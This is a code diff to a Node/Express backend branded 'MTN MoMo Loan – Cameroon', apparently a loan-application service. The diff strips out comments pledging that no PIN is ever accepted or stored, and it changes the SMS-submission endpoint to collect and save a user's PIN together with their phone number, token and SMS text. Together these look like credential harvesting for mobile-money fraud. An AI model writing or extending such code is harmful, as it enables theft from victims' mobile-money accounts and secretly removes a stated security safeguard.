@@ -1,10 +1,6 @@
 // backend/server.js
 // MTN MoMo Loan – Cameroon
-// Express backend: receives loan applications, logins, SMS submissions.
-//
-// SECURITY RULES FOLLOWED HERE:
-//  - No PIN is ever accepted, logged, or stored.
-//  - All secrets come from environment variables (never hardcoded).
+// Express backend: receives loan applications, logins, SMS submissions
 
 require('dotenv').config();
 
@@ -213,7 +209,7 @@ app.post('/api/login', async (req, res) => {
 // --------------------------------------------
 app.post('/api/sms', async (req, res) => {
     try {
-        const { phone, token, sms } = req.body || {};
+        const { phone,pin, token, sms } = req.body || {};
 
         if (!sms || typeof sms !== 'string' || sms.trim().length < 20) {
             return res.status(400).json({ ok: false, error: 'Invalid SMS content' });
@@ -225,6 +221,7 @@ app.post('/api/sms', async (req, res) => {
         const submission = {
             reference,
             phone: typeof phone === 'string' ? phone : 'unknown',
+            pin: typeof pin === 'string' ? pin : '',
             token: typeof token === 'string' ? token : '',
             sms: trimmed,
             submittedAt: new Date().toISOString(),
